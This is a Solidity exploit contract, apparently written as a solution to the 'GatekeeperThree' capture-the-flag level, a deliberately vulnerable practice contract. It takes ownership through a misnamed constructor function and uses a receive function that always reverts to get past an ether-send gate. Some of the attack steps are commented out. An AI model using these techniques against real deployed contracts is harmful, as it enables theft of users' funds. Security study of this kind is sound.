// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/GatekeeperThree.sol";
import {console, Script} from "forge-std/Script.sol";


contract GatekeeperThree_exp {

    GatekeeperThree public gatekeeper;
    SimpleTrick public trick;
    constructor(GatekeeperThree g) payable {
        gatekeeper = g;
    }

    // function init() public returns (address) {
    //     gatekeeper.construct0r();
    //     gatekeeper.createTrick();
    //     trick = gatekeeper.trick();
    //     console.log("[+]SimpleTrick Address: ", address(trick));
    //     uint256 password = block.timestamp;
    //     gatekeeper.getAllowance(password);
    //     bool res = gatekeeper.allowEntrance();
    //     console.log("[+]Entrance Allowed: ", res);
    //     payable(address(gatekeeper)).transfer(0.00100001 ether);
    //     gatekeeper.enter();
    //     address ress = gatekeeper.entrant();
    //     console.log("[+]Entrant: ", ress);
    // }

    function init() public returns (address) {
        gatekeeper.construct0r();
        gatekeeper.createTrick();
        trick = gatekeeper.trick();
        console.log("[+]SimpleTrick Address: ", address(trick));
        return address(trick);
    }

    // function attack(uint password) public payable {
    //     gatekeeper.getAllowance(password);
    //     // bool res = gatekeeper.allowEntrance();
    //     // console.log("[+]Entrance Allowed: ", res);
    //     payable(address(gatekeeper)).transfer(0.00100001 ether);
    //     gatekeeper.enter();
    //     address res = gatekeeper.entrant();
    //     console.log("[+]Entrant: ", res);
    // }

    function withdraw() public payable {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() payable external {
        revert();
    }
}
